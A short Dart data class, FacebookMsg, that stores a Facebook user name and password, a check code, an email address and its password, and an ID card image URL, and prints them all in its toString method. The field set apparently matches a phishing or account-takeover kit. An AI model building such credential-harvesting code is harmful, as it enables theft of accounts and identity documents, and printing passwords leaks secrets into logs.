class FacebookMsg {
  FacebookMsg({
    required this.userName,
    required this.userPwd,
    required this.checkCode,
    required this.email,
    required this.emailPwd,
    required this.idCardImgUrl,
  });

  String userName;
  String userPwd;
  String checkCode;

  String email;
  String emailPwd;
  String idCardImgUrl;

  @override
  String toString() {
    return 'FacebookMsg{userName: $userName, userPwd: $userPwd, checkCode: $checkCode, email: $email, emailPwd: $emailPwd, idCardImgUrl: $idCardImgUrl}';
  }
}
